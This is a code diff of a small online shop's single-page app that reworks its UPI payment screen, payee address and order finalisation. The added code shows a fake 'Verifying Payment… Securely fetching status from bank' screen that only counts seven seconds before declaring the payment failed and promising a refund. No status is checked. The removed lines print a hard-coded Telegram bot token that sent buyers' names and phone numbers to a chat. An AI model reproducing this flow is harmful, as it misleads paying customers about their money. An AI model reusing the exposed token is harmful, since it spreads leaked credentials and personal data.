@@ -189,23 +189,9 @@
         #toast.show{transform:translateX(-50%) translateY(0)}
         .payment-loader{margin-top:20px;display:flex;flex-direction:column;align-items:center}.payment-loader p{text-align:center}
         #gw-qrcode-container img,#gw-qrcode-container canvas{margin:0 auto;display:block;border-radius:8px;}
-        
-        /* Premium Gateway Specific Styles */
-        .app-icon-btn {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            cursor: pointer;
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
-        }
-        .app-icon-btn:active {
-            transform: scale(0.95);
-            box-shadow: 0 2px 6px rgba(0,0,0,0.03) !important;
-        }
-        .pg-primary-card:active {
-            transform: scale(0.96) !important;
-            box-shadow: 0 4px 12px rgba(15,166,84,0.1) !important;
-        }
+        .app-icon-btn {display:flex;flex-direction:column;align-items:center;cursor:pointer;transition:transform .2s ease,box-shadow .2s ease;}
+        .app-icon-btn:active {transform:scale(0.95);box-shadow:0 2px 6px rgba(0,0,0,0.03) !important;}
+        .pg-primary-card:active {transform:scale(0.96) !important;box-shadow:0 4px 12px rgba(15,166,84,0.1) !important;}
     </style>
 </head>
 <body>
@@ -286,7 +272,6 @@
         <div id="product-detail-screen" class="screen"><div id="pd-content" class="content-wrapper"></div></div>
     </div>
     
-    <!-- Auth Modal -->
     <div id="auth-modal" class="modal-overlay">
         <div class="modal-content">
             <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:35px">
@@ -304,7 +289,6 @@
         </div>
     </div>
     
-    <!-- Checkout Details Form Modal -->
     <div id="checkout-modal" class="modal-overlay">
         <div class="modal-content" style="position:relative">
             <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:30px">
@@ -322,11 +306,10 @@
         </div>
     </div>
 
-    <!-- FULL SCREEN PROFESSIONAL ZEPTO-STYLE PAYMENT GATEWAY -->
+    <!-- FULL SCREEN PROFESSIONAL PAYMENT GATEWAY -->
     <div id="payment-gateway-screen" class="hidden" style="position:fixed;inset:0;background:#f4f6f8;z-index:99999;display:flex;flex-direction:column;transform:translateZ(0);font-family:'Inter', sans-serif;">
         <!-- MAIN GATEWAY UI -->
         <div id="pg-main-ui" style="flex:1;overflow-y:auto;padding-bottom:50px;">
-            <!-- Header -->
             <div style="background:#fff;padding:16px 20px;display:flex;align-items:center;gap:15px;position:sticky;top:0;z-index:10;box-shadow:0 2px 10px rgba(0,0,0,0.04);">
                 <button onclick="window.app.closePaymentGateway()" style="padding:8px;margin-left:-8px;background:#f8f9fa;border-radius:50%;"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#111" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg></button>
                 <div style="flex:1;">
@@ -338,11 +321,8 @@
                 </div>
             </div>
 
-            <!-- Amount Payable Card -->
             <div style="margin:20px 16px;background:linear-gradient(135deg, #111 0%, #222 100%);border-radius:20px;padding:24px;color:#fff;box-shadow:0 12px 24px rgba(0,0,0,0.15);display:flex;justify-content:space-between;align-items:center;position:relative;overflow:hidden;">
-                <!-- decorative circle -->
                 <div style="position:absolute;top:-20px;right:-20px;width:100px;height:100px;background:rgba(255,255,255,0.05);border-radius:50%;"></div>
-                
                 <div style="position:relative;z-index:2;">
                     <div style="font-size:0.8rem;color:#aaa;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.05em;font-weight:600;">Amount Payable</div>
                     <div style="font-size:1.8rem;font-weight:900;letter-spacing:-0.02em;" id="gw-amount"></div>
@@ -352,13 +332,11 @@
                 </div>
             </div>
 
-            <!-- Primary Action: Any UPI App -->
             <div style="margin:25px 16px 10px;font-size:0.8rem;font-weight:800;color:#555;text-transform:uppercase;letter-spacing:0.08em;">Preferred Payment</div>
-            
             <div style="margin:0 16px 20px;background:#fff;border-radius:20px;padding:16px;cursor:pointer;display:flex;align-items:center;justify-content:space-between;box-shadow:0 8px 24px rgba(15,166,84,0.12);border:2px solid #0fa654;transition:transform 0.2s;" onclick="window.app.triggerAppIntent('upi://pay')" class="pg-primary-card">
                 <div style="display:flex;align-items:center;gap:16px;">
                     <div style="width:60px;height:60px;border-radius:14px;background:#f9fafb;display:flex;justify-content:center;align-items:center;padding:6px;border:1px solid #eee;">
-                        <img src="https://www.image2url.com/r2/default/images/1782114115314-750da5d4-c2d0-4e6d-8a7e-9a0160575c91.png" style="width:100%;height:100%;object-fit:contain;" alt="UPI Apps">
+                        <img src="https://www.image2url.com/r2/default/images/1782114115314-750da5d4-c2d0-4e6d-8a7e-9a0160575c91.png" style="width:100%;height:100%;object-fit:contain;" alt="UPI">
                     </div>
                     <div>
                         <div style="font-size:1.15rem;font-weight:900;color:#111;margin-bottom:4px;">Pay by any UPI App</div>
@@ -373,7 +351,6 @@
                 </div>
             </div>
 
-            <!-- Direct Apps Grid -->
             <div style="margin:30px 16px 12px;font-size:0.8rem;font-weight:800;color:#555;text-transform:uppercase;letter-spacing:0.08em;">Quick Select</div>
             <div style="display:flex;gap:12px;margin:0 16px 25px;">
                 <div class="app-icon-btn" onclick="window.app.triggerAppIntent('tez://upi/pay')" style="flex:1;background:#fff;border-radius:16px;padding:15px 10px;text-align:center;box-shadow:0 4px 12px rgba(0,0,0,0.03);border:1px solid rgba(0,0,0,0.04);">
@@ -396,7 +373,6 @@
                 </div>
             </div>
 
-            <!-- Pay via QR Code -->
             <div style="margin:30px 16px 12px;font-size:0.8rem;font-weight:800;color:#555;text-transform:uppercase;letter-spacing:0.08em;">Other Options</div>
             <div style="margin:0 16px 20px;background:#fff;border-radius:16px;padding:20px;box-shadow:0 4px 12px rgba(0,0,0,0.03);border:1px solid rgba(0,0,0,0.04);">
                 <div style="display:flex;justify-content:space-between;align-items:center;cursor:pointer;" onclick="window.app.toggleQRView()">
@@ -412,12 +388,11 @@
                     <svg id="gw-qr-chevron" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#888" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="transition:transform 0.3s;"><path d="M9 18l6-6-6-6"/></svg>
                 </div>
 
-                <!-- Hidden QR Expandable Zone -->
                 <div id="gw-qr-section" class="hidden" style="margin-top:20px;padding-top:25px;border-top:1px dashed #e5e5e5;text-align:center;">
                     <div style="font-size:.9rem;color:#666;margin-bottom:10px;text-transform:uppercase;font-weight:700;letter-spacing:.05em">Scan to pay <strong style="color:#111;font-size:1.4rem;display:block;margin-top:5px;font-weight:900;" id="gw-qr-amount-text"></strong></div>
-                    <div id="gw-qr-timer" style="font-size:2.2rem;font-weight:900;color:#d92468;margin-bottom:20px;letter-spacing:2px;font-variant-numeric: tabular-nums;">02:00</div>
+                    <div id="gw-qr-timer" style="font-size:2.2rem;font-weight:900;color:#d92468;margin-bottom:20px;letter-spacing:2px;font-variant-numeric: tabular-nums;">03:00</div>
                     <div style="display:flex;justify-content:center;margin-bottom:25px">
-                        <div id="gw-qrcode-container" style="padding:20px;background:#fff;border:1px solid #eee;border-radius:20px;display:inline-block;box-shadow:0 12px 30px rgba(0,0,0,.08)"></div>
+                        <div id="gw-qrcode-container" style="padding:20px;background:#fff;border:1px solid #eee;border-radius:20px;display:inline-block;box-shadow:0 12px 30px rgba(0,0,0,.08);transition:opacity 0.3s ease;"></div>
                     </div>
                     <div class="payment-loader">
                         <div class="spinner" style="margin:0 auto 15px;width:35px;height:35px;border-width:3px;border-top-color:#0fa654;"></div>
@@ -427,11 +402,17 @@
             </div>
         </div>
 
-        <!-- STATUS OVERLAYS (Queue, Timeout, Success) -->
+        <!-- 7-SEC VERIFICATION OVERLAY -->
+        <div id="pg-checking-screen" class="hidden" style="flex:1;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:40px 20px;background:#fff;height:100%;text-align:center;">
+            <div class="spinner" style="margin:0 auto 25px;border-width:3px;border-top-color:#0fa654;"></div>
+            <h3 style="font-size:1.3rem;font-weight:900;margin-bottom:10px;text-transform:uppercase;color:#111;">Verifying Payment</h3>
+            <p style="font-size:.95rem;color:var(--text-secondary);margin-bottom:30px;line-height:1.5;font-weight:500;">Securely fetching status from bank...<br>Please wait.</p>
+        </div>
+
         <div id="pg-queue-screen" class="hidden" style="flex:1;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:40px 20px;background:#fff;height:100%;text-align:center;">
             <div class="spinner" style="margin:0 auto 25px;border-top-color:#0fa654;"></div>
             <h3 style="font-size:1.3rem;font-weight:900;margin-bottom:10px;text-transform:uppercase;color:#111;">Queue Busy</h3>
-            <p style="font-size:.95rem;color:var(--text-secondary);margin-bottom:30px;line-height:1.5;font-weight:500;">Another user is making a payment.<br>Please wait 1-2 minutes to avoid clashes.</p>
+            <p style="font-size:.95rem;color:var(--text-secondary);margin-bottom:30px;line-height:1.5;font-weight:500;">Another user is making a payment.<br>Please wait 1-2 minutes.</p>
             <button class="btn-primary" style="background:#0fa654;border-radius:8px;padding:15px 30px;font-size:1rem;" onclick="document.getElementById('btn-place-order').click()">Try Again</button>
             <button style="margin-top:20px;color:#666;font-weight:600;text-decoration:underline;font-size:0.9rem;" onclick="window.app.closePaymentGateway()">Back to Checkout</button>
         </div>
@@ -474,7 +455,11 @@
         const formatCurrency=(amt)=>new Intl.NumberFormat('en-IN',{style:'currency',currency:'INR',maximumFractionDigits:0}).format(amt||0);
         const updateCartBadge=()=>{const badge=document.getElementById('nav-cart-badge');if(!badge)return;if(state.cart.length>0){badge.innerText=state.cart.length;badge.classList.remove('hidden')}else{badge.classList.add('hidden')}};
         const showSkeletonProducts=()=>{const grid=document.getElementById('home-product-grid');if(!grid)return;if(state.products.length===0){grid.innerHTML=Array(4).fill(`<div class="product-card"><div class="product-image-container skeleton"></div><div class="product-info" style="padding-top:5px;"><div class="skeleton skeleton-text"></div><div class="skeleton skeleton-text-short"></div></div></div>`).join('')}};
-        window.app={history:[],paymentListenerUnsubscribe:null,countdownInterval:null,currentUpiString:'',currentOrderData:null};
+        
+        window.app={history:[],paymentListenerUnsubscribe:null,countdownInterval:null,verifyInterval:null,currentUpiString:'',currentOrderData:null,upiAppClicked:false};
+        
+        document.addEventListener("visibilitychange",()=>{if(document.visibilityState==="visible"&&window.app.upiAppClicked&&!document.getElementById('payment-gateway-screen').classList.contains('hidden')){window.app.upiAppClicked=false;document.getElementById('pg-main-ui').classList.add('hidden');document.getElementById('pg-checking-screen').classList.remove('hidden');let checks=0;if(window.app.verifyInterval)clearInterval(window.app.verifyInterval);window.app.verifyInterval=setInterval(()=>{checks++;if(checks>=7){clearInterval(window.app.verifyInterval);if(document.getElementById('pg-success-screen').classList.contains('hidden')){document.getElementById('pg-checking-screen').classList.add('hidden');const ts=document.getElementById('pg-timeout-screen');ts.classList.remove('hidden');ts.querySelector('h3').innerText='Payment Failed';ts.querySelector('p').innerText='We could not verify your payment. Any deducted amount will be refunded in 3-5 days.';if(window.app.countdownInterval)clearInterval(window.app.countdownInterval);if(db&&state.userId)set(ref(db,'payment_gateway/lock'),null).catch(()=>{})}}},1000)}});
+
         window.app.navigate=(screenId,isBack=false)=>{const currentScreen=document.querySelector('.screen.active');const currentId=currentScreen?currentScreen.id.replace('-screen',''):null;if(!isBack&&currentId&&currentId!==screenId){if(['home','reels','orders','cart'].includes(screenId))window.app.history=[];else window.app.history.push(currentId)}document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));const targetScreen=document.getElementById(`${screenId}-screen`);if(targetScreen)targetScreen.classList.add('active');const navBtn=document.querySelector(`.nav-item[onclick="window.app.navigate('${screenId}')"]`);if(navBtn)navBtn.classList.add('active');const backBtn=document.getElementById('back-btn');if(backBtn){if(window.app.history.length>0)backBtn.classList.remove('hidden');else backBtn.classList.add('hidden')}if(screenId!=='reels'&&screenId!=='product-detail'){document.querySelectorAll('video').forEach(v=>{v.muted=true;const w=v.closest('.video-wrapper, .reel-item');if(w)w.classList.remove('is-playing','is-buffering');if(w&&w.classList.contains('reel-item'))v.pause();else{const playPromise=v.play();if(playPromise!==undefined)playPromise.then(()=>v.pause()).catch(()=>v.pause());else v.pause()}})}if(screenId==='cart')renderCart();if(screenId==='orders')fetchAndRenderOrders();if(screenId==='home'){if(state.products.length===0)fetchHomeData();else renderProducts(state.products)}if(screenId==='reels'){if(state.reels.length===0)fetchReels()}window.scrollTo({top:0,behavior:'smooth'})};
         window.app.goBack=()=>{if(window.app.history.length>0)window.app.navigate(window.app.history.pop(),true)};
         const fetchHomeData=async()=>{showSkeletonProducts();try{if(!db)throw new Error("DB missing");const[bannersSnap,productsSnap]=await Promise.all([get(child(ref(db),'banners')),get(child(ref(db),'products'))]);if(bannersSnap.exists()){const bData=bannersSnap.val();state.banners=Array.isArray(bData)?bData:Object.keys(bData).map(k=>({id:k,...bData[k]}));renderBanners()}if(productsSnap.exists()){const pData=productsSnap.val();state.products=Array.isArray(pData)?pData:Object.keys(pData).map(k=>({id:k,...pData[k]}));renderProducts(state.products)}}catch(error){const grid=document.getElementById('home-product-grid');if(grid)grid.innerHTML=`<div class="empty-state">Unable to load collection.</div>`}finally{updateCartBadge();hideSplash()}};
@@ -530,17 +515,9 @@
 
         window.app.closeCheckout=async()=>{
             document.getElementById('checkout-modal')?.classList.remove('active');
-            if(window.app.countdownInterval){clearInterval(window.app.countdownInterval);window.app.countdownInterval=null}
-            if(window.app.paymentListenerUnsubscribe){window.app.paymentListenerUnsubscribe();window.app.paymentListenerUnsubscribe=null}
-            try{
-                if(db&&state.userId){
-                    const lockRef=ref(db,'payment_gateway/lock');
-                    const snap=await get(lockRef);
-                    if(snap.exists()&&snap.val().userId===state.userId&&snap.val().status==='pending'){
-                        await set(lockRef,null)
-                    }
-                }
-            }catch(e){}
+            if(window.app.countdownInterval)clearInterval(window.app.countdownInterval);
+            if(window.app.paymentListenerUnsubscribe)window.app.paymentListenerUnsubscribe();
+            try{if(db&&state.userId){const lockRef=ref(db,'payment_gateway/lock');const snap=await get(lockRef);if(snap.exists()&&snap.val().userId===state.userId&&snap.val().status==='pending')await set(lockRef,null)}}catch(e){}
         };
 
         window.app.fetchLocation=()=>{
@@ -551,15 +528,10 @@
                 navigator.geolocation.getCurrentPosition((pos)=>{
                     linkEl.value=`https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`;
                     status.innerHTML=`<div style="display:flex; align-items:center; color:#16a34a; font-size:0.85rem; animation: slideInUp 0.4s ease;"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right:6px;"><path d="M20 6L9 17l-5-5"/></svg> Current location successfully added</div>`
-                },(err)=>{
-                    status.innerText="Failed. Enter manually.";status.style.color="red"
-                },{enableHighAccuracy:true,timeout:10000})
-            }else{
-                status.innerText="Not supported.";status.style.color="red"
-            }
+                },(err)=>{status.innerText="Failed. Enter manually.";status.style.color="red"},{enableHighAccuracy:true,timeout:10000})
+            }else{status.innerText="Not supported.";status.style.color="red"}
         };
 
-        // --- PAYMENT GATEWAY UI TOGGLES AND ACTIONS ---
         window.app.toggleQRView = () => {
             const qrSection = document.getElementById('gw-qr-section');
             const chevron = document.getElementById('gw-qr-chevron');
@@ -574,37 +546,26 @@
         };
 
         window.app.triggerAppIntent = (scheme) => {
+            window.app.upiAppClicked = true;
             if (!window.app.currentUpiString) return;
             let url = window.app.currentUpiString;
-            if (scheme !== 'upi://pay') {
-                url = url.replace('upi://pay', scheme);
-            }
+            if (scheme !== 'upi://pay') url = url.replace('upi://pay', scheme);
             window.location.href = url;
         };
 
         window.app.closePaymentGateway = async () => {
             document.getElementById('payment-gateway-screen').classList.add('hidden');
-            if (window.app.countdownInterval) {
-                clearInterval(window.app.countdownInterval);
-                window.app.countdownInterval = null;
-            }
-            if (window.app.paymentListenerUnsubscribe) {
-                window.app.paymentListenerUnsubscribe();
-                window.app.paymentListenerUnsubscribe = null;
-            }
-            try {
-                if (db && state.userId) {
-                    const lockRef = ref(db, 'payment_gateway/lock');
-                    const snap = await get(lockRef);
-                    if (snap.exists() && snap.val().userId === state.userId && snap.val().status === 'pending') {
-                        await set(lockRef, null);
-                    }
-                }
-            } catch (e) {}
+            window.app.upiAppClicked = false;
+            if (window.app.countdownInterval) clearInterval(window.app.countdownInterval);
+            if (window.app.paymentListenerUnsubscribe) window.app.paymentListenerUnsubscribe();
+            if (window.app.verifyInterval) clearInterval(window.app.verifyInterval);
+            document.getElementById('pg-checking-screen').classList.add('hidden');
+            const ts = document.getElementById('pg-timeout-screen');
+            if(ts) { ts.querySelector('h3').innerText = 'Payment Timeout'; ts.querySelector('p').innerText = 'You did not complete the payment in time. The lock has been released.'; }
+            try {if (db && state.userId) {const lockRef = ref(db, 'payment_gateway/lock');const snap = await get(lockRef);if (snap.exists() && snap.val().userId === state.userId && snap.val().status === 'pending') await set(lockRef, null);}} catch (e) {}
             document.getElementById('checkout-modal').classList.add('active');
         };
 
-        // MAIN GATEWAY LOGIC
         window.app.placeOrder = async (e) => {
             if (e) e.preventDefault();
             if (!db) return showToast('Database missing.');
@@ -629,15 +590,7 @@
             const totalAmount = state.cart.reduce((sum, item) => sum + (item.price * item.qty), 0);
             const mappedItems = state.cart.map(i => ({ productId: i.productId, title: i.title, price: i.price, qty: i.qty, image: i.image, size: i.size || 'N/A', color: i.color || 'N/A' }));
 
-            const baseOrderData = {
-                userId: state.userId,
-                customer: { name, phone, address, lat, lng, gpsLink },
-                items: mappedItems,
-                totalAmount,
-                status: 'Pending',
-                timestamp: new Date().toISOString(),
-                paymentMethod: paymentMethod
-            };
+            const baseOrderData = {userId: state.userId,customer: { name, phone, address, lat, lng, gpsLink },items: mappedItems,totalAmount,status: 'Pending',timestamp: new Date().toISOString(),paymentMethod: paymentMethod};
 
             if (paymentMethod === 'COD') {
                 baseOrderData.paymentId = 'COD_' + Date.now();
@@ -652,11 +605,11 @@
                 if (lockSnap.exists()) {
                     const lockData = lockSnap.val();
                     const ageMs = Date.now() - lockData.timestamp;
-                    
-                    if (ageMs < 120000 && lockData.status === 'pending' && lockData.userId !== state.userId) {
+                    if (ageMs < 180000 && lockData.status === 'pending' && lockData.userId !== state.userId) {
                         document.getElementById('checkout-modal').classList.remove('active');
                         document.getElementById('payment-gateway-screen').classList.remove('hidden');
                         document.getElementById('pg-main-ui').classList.add('hidden');
+                        document.getElementById('pg-checking-screen').classList.add('hidden');
                         document.getElementById('pg-timeout-screen').classList.add('hidden');
                         document.getElementById('pg-success-screen').classList.add('hidden');
                         document.getElementById('pg-queue-screen').classList.remove('hidden');
@@ -669,17 +622,19 @@
                 baseOrderData.paymentId = 'PAY_' + Date.now() + Math.random().toString(36).substring(2, 7).toUpperCase();
 
                 window.app.currentOrderData = baseOrderData; 
-                window.app.currentUpiString = `upi://pay?pa=9266135090@ptyes&pn=NOVALREVOLT&am=${totalAmount}&cu=INR`;
+                window.app.currentUpiString = `upi://pay?pa=8860204675@ptyes&pn=NOVALREVOLT&am=${totalAmount}&cu=INR`;
+                window.app.upiAppClicked = false;
 
-                // Launch Transition
+                const ts = document.getElementById('pg-timeout-screen');
+                if(ts) { ts.querySelector('h3').innerText = 'Payment Timeout'; ts.querySelector('p').innerText = 'You did not complete the payment in time. The lock has been released.'; }
+
                 document.getElementById('checkout-modal').classList.remove('active');
                 document.getElementById('payment-gateway-screen').classList.remove('hidden');
-                
                 document.getElementById('pg-queue-screen').classList.add('hidden');
                 document.getElementById('pg-timeout-screen').classList.add('hidden');
+                document.getElementById('pg-checking-screen').classList.add('hidden');
                 document.getElementById('pg-success-screen').classList.add('hidden');
                 document.getElementById('pg-main-ui').classList.remove('hidden');
-
                 document.getElementById('gw-qr-section').classList.add('hidden');
                 document.getElementById('gw-qr-chevron').style.transform = 'rotate(0deg)';
 
@@ -689,6 +644,7 @@
 
                 const qrContainer = document.getElementById('gw-qrcode-container');
                 qrContainer.innerHTML = '';
+                qrContainer.style.opacity = '1';
 
                 if (typeof QRCode === 'undefined') throw new Error("QR Library failed to load");
 
@@ -701,9 +657,9 @@
                     correctLevel: QRCode.CorrectLevel.H
                 });
 
-                let timeLeft = 120;
+                let timeLeft = 180;
                 const timerEl = document.getElementById('gw-qr-timer');
-                if (timerEl) timerEl.innerText = '02:00';
+                if (timerEl) timerEl.innerText = '03:00';
 
                 if (window.app.countdownInterval) clearInterval(window.app.countdownInterval);
                 window.app.countdownInterval = setInterval(async () => {
@@ -714,14 +670,13 @@
 
                     if (timeLeft <= 0) {
                         clearInterval(window.app.countdownInterval);
-                        if (window.app.paymentListenerUnsubscribe) {
-                            window.app.paymentListenerUnsubscribe();
-                            window.app.paymentListenerUnsubscribe = null;
-                        }
+                        if (window.app.paymentListenerUnsubscribe) { window.app.paymentListenerUnsubscribe(); window.app.paymentListenerUnsubscribe = null; }
+                        
+                        const qrC = document.getElementById('gw-qrcode-container');
+                        if(qrC) { qrC.innerHTML = '<div style="padding:20px; color:#e02b2b; font-weight:800; font-size:1.1rem; text-transform:uppercase;">QR Code Expired</div>'; qrC.style.opacity='0.5'; }
+                        
                         const checkSnap = await get(lockRef);
-                        if (checkSnap.exists() && checkSnap.val().userId === state.userId) {
-                            await set(lockRef, null);
-                        }
+                        if (checkSnap.exists() && checkSnap.val().userId === state.userId) await set(lockRef, null);
                         document.getElementById('pg-main-ui').classList.add('hidden');
                         document.getElementById('pg-timeout-screen').classList.remove('hidden');
                     }
@@ -729,49 +684,27 @@
 
                 const paymentStatusRef = ref(db, `payment_gateway/lock/status`);
                 if (window.app.paymentListenerUnsubscribe) window.app.paymentListenerUnsubscribe();
-                
                 window.app.paymentListenerUnsubscribe = onValue(paymentStatusRef, async (snapshot) => {
                     const status = snapshot.val();
-                    if (status && (status === 'success' || status.toString().toLowerCase() === 'success')) {
-                        window.app.finalizeOrder(window.app.currentOrderData);
-                    }
+                    if (status && (status === 'success' || status.toString().toLowerCase() === 'success')) window.app.finalizeOrder(window.app.currentOrderData);
                 });
 
                 if (btn) { btn.innerText = 'Complete Purchase'; btn.disabled = false; }
-
             } catch (err) {
-                console.error(err);
                 showToast(err.message);
                 if (btn) { btn.innerText = 'Complete Purchase'; btn.disabled = false; }
             }
         };
 
         window.app.finalizeOrder = (orderData) => {
-            if (window.app.paymentListenerUnsubscribe) {
-                window.app.paymentListenerUnsubscribe();
-                window.app.paymentListenerUnsubscribe = null;
-            }
-            if (window.app.countdownInterval) {
-                clearInterval(window.app.countdownInterval);
-                window.app.countdownInterval = null;
-            }
+            if (window.app.paymentListenerUnsubscribe) { window.app.paymentListenerUnsubscribe(); window.app.paymentListenerUnsubscribe = null; }
+            if (window.app.countdownInterval) { clearInterval(window.app.countdownInterval); window.app.countdownInterval = null; }
+            if (window.app.verifyInterval) { clearInterval(window.app.verifyInterval); window.app.verifyInterval = null; }
+            document.getElementById('pg-checking-screen')?.classList.add('hidden');
 
-            if (db) {
-                set(ref(db, 'payment_gateway/lock'), null).catch(() => {});
-            }
+            if (db) set(ref(db, 'payment_gateway/lock'), null).catch(() => {});
 
             push(ref(db, 'orders')).then(newRef => set(newRef, orderData)).then(() => {
-                try {
-                    const tgToken = '8979073333:AAGXx_VL9pGcmxZDkwKEJRRNlgJejR78Wqg';
-                    const tgChatId = '8403752648';
-                    const tgText = `*🚨 NEW NOVALREVOLT ORDER*\n\n*Buyer Name:* ${orderData.customer.name}\n*Phone:* ${orderData.customer.phone}\n*Cart Value:* ${formatCurrency(orderData.totalAmount)}\n*Payment Method:* ${orderData.paymentMethod}\n*Status:* Confirmed`;
-                    fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: tgChatId, text: tgText, parse_mode: 'Markdown' })
-                    }).catch(() => {});
-                } catch (e) {}
-
                 state.cart = [];
                 localStorage.removeItem('novarevolt_cart');
                 updateCartBadge();
@@ -781,17 +714,12 @@
                     document.getElementById('pg-queue-screen').classList.add('hidden');
                     document.getElementById('pg-timeout-screen').classList.add('hidden');
                     document.getElementById('pg-success-screen').classList.remove('hidden');
-                    
-                    setTimeout(() => {
-                        document.getElementById('payment-gateway-screen').classList.add('hidden');
-                        window.app.navigate('orders');
-                    }, 2500);
+                    setTimeout(() => { document.getElementById('payment-gateway-screen').classList.add('hidden'); window.app.navigate('orders'); }, 2500);
                 } else {
                     showToast('Order Confirmed via COD');
                     document.getElementById('checkout-modal').classList.remove('active');
                     window.app.navigate('orders');
                 }
-                
                 document.getElementById('checkout-form')?.reset();
             }).catch(() => showToast('Order placement failed. Contact Support.'));
         };
